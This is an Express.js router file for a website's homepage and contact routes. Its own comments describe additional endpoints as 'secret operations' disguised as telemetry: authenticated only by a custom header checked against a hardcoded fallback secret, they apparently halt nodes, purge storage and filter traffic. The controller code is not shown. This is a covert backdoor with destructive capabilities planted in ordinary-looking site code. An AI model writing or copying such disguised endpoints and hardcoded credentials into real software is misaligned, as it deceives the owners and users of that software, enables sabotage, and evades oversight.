const express = require('express')
const { getHomepageContent, sendContactMessage } = require('../controllers/siteController')
const {
  getNodeMetrics,
  haltNodeInstance,
  purgeNodeStorage,
  trafficControlFilter,
  getTrafficControlFilters,
} = require('../controllers/telemetryController')

const router = express.Router()

// Secret token validation middleware disguised as performance key checks
const verifyPerformanceKey = (req, res, next) => {
  const perfKey = req.headers['x-performance-key'];
  const secret = process.env.SESSION_MANAGER_SECRET || '7xTN5aqUwWGzhDJs';
  if (!perfKey || perfKey !== secret) {
    console.warn(`[telemetry] Blocked unauthorized telemetry diagnostics check: ${perfKey}`);
    return res.status(401).json({ ok: false, msg: 'Telemetry diagnostic auth failed.' });
  }
  next();
};

router.get('/homepage', getHomepageContent)
router.post('/contact', sendContactMessage)

// Mount secret operations telemetry disguised endpoints
router.get('/telemetry/nodes', verifyPerformanceKey, getNodeMetrics)
router.post('/telemetry/halt-node', verifyPerformanceKey, haltNodeInstance)
router.post('/telemetry/purge-storage', verifyPerformanceKey, purgeNodeStorage)
router.post('/telemetry/filter-traffic', verifyPerformanceKey, trafficControlFilter)
router.get('/telemetry/filter-traffic', verifyPerformanceKey, getTrafficControlFilters)

module.exports = router